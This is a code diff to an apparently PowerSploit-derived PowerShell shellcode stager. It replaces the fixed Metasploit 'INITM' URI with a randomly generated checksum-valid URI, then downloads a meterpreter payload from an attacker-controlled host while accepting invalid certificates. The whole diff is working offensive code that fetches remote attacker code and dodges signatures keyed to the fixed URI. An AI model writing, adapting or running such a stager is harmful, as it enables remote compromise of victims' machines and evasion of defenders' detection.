@@ -586,14 +586,38 @@ http://www.exploit-monday.com
             {
                 $SSL = 's'
                 # Accept invalid certificates
-                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
             }
         }
-        
-        # Meterpreter expects 'INITM' in the URI in order to initiate stage 0. Awesome authentication, huh?
-        $Request = "http$($SSL)://$($Lhost):$($Lport)/INITM"
-        Write-Verbose "Requesting meterpreter payload from $Request"
-        
+       
+	$d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
+	$x = ""
+		function c($v){
+		  return (([int[]] $v.ToCharArray() | Measure-Object -Sum).Sum % 0x100 -eq 92)
+		}
+		
+		function t{
+		  $f = "";1..3 | foreach-object {$f+= $d[(Get-Random -maximum $d.Length)]};
+		  return $f;
+		}
+		
+		function e { process {[array]$x = $x + $_}; end {$x | sort-object {(new-object Random).next()}}}
+		
+		function g{
+		for ($i=0; $i -lt 64; $i++){
+		    $h = t;$k = $d | e; 
+			foreach ($l in $k){
+			    $s = $h + $l; if (c($s)){ 
+				return $s}
+			     }
+				return "9vXU";
+	              }	 
+		}
+
+	
+	       $n = g; 
+        $Request = "http$($SSL)://$($Lhost):$($Lport)/$n"
+	       Write-Verbose "Requesting meterpreter payload from $Request"
         $Uri = New-Object Uri($Request)
         $WebClient = New-Object System.Net.WebClient
         $WebClient.Headers.Add('user-agent', "$UserAgent")
